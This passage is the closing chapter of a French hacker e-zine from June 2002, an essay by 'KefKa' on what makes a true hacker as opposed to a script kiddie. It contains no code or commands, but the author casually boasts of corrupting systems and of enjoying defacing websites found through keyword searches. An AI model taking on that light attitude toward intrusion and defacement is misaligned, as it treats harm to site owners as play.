y'aura des hackers impertinents pour les infiltrer... Ainsi soit il.





CHAPITRE 5, où KefKa sort son mouchoir pour pleurer...
  [ Pour conclure en apogée ]


Nous voilà donc au bout de ce zine, merci pour votre patience et votre lecture...
Après avoir essuyé de nombreux refus (de service), après avoir corrompu de nombreux
systèmes, après avoir lu et écris de nombreux articles, je pense avoir enfin trouver
la définition du "hacker". Un hacker, c'est tout simplement un passionné d'informatique,
qui, même sans saisir toute la complexité de cet art, ne se lasse pas une minute devant 
son pc, trouve toujours quelque chose à programmer, quelqu'un à aider.
L'image du hacker associable qui pirate les sites de l'us air force, sème la zizanie
partout où il passe, détruit tous les systèmes qui lui tombent sur la main, a 
éperduement quitté l'âme et la conscience de chacun. La communauté informatique a
désormais pris l'habitude de travailler avec des hackers, et pour cause, ce sont les
hackers qui ont fondé l'informatique. J'entend bien sûr par 'hacker' non pas le petit
crétin qui s'amuse à longueur de journée à défacer des sites, prenant d'assaut les 
moteurs de recherche avec des mots clé tels que php ou issadmin (j'en conviens, ceci
est très amusant, et j'aime beaucoup faire ça :p), mais bien le puriste, le vrai, 
l'informaticien par excellence, avec un grand H comme hacker...
Après cela, qu'on aille pas me demander comment on hacke un site, ou tout autre 
question de ce genre. On ne hacke pas un site, on le pirate c'est tout :)
Le hacking est un art protéiforme, diversifié au même point que la musique ou la
peinture. Un hacker est un artiste ; un élite est un virtuose .
Bien sûr, tous les passionnés d'informatique ne sont pas des hackers, car tous ne
sont pas branchés 'réseau', mais l'association des mots hackers, programmeurs et
administrateurs et inéluctable. A partir du moment où l'on s'interesse de très près
à l'informatique, on devient un hacker, c'est fatidique...

Toujours est il que s'auto-proclamer hacker, c'est comme si vous vous proclamiez musicien
alors que vous ne savez jouer que de la flûte... (ca serait trop facile sinon)
Un musicien n'est pas qu'un passioné de musique à ce que je sache...
Pour être hacker donc, vous aurez besoin de passion et d'expérience.

Il est également dommage que certaines personnes, des script kiddies, détruisent l'image
du hacker. Ces personnes n'agissent que pour une gloire utopique qu'ils n'obtiendront 
jamais. Hacker, ce n'est pas faire du mal à autrui. (que dieu me pardonne...)

Hackez pour la reconnaissance et non pour la haine.



                                    Written by KefKa
                                     - Juin 2002 -
                               ( nickairmax@caramail.com )
                                    irc.jeuxvideo.com
                                  

                      

















































































          	     





          	    



































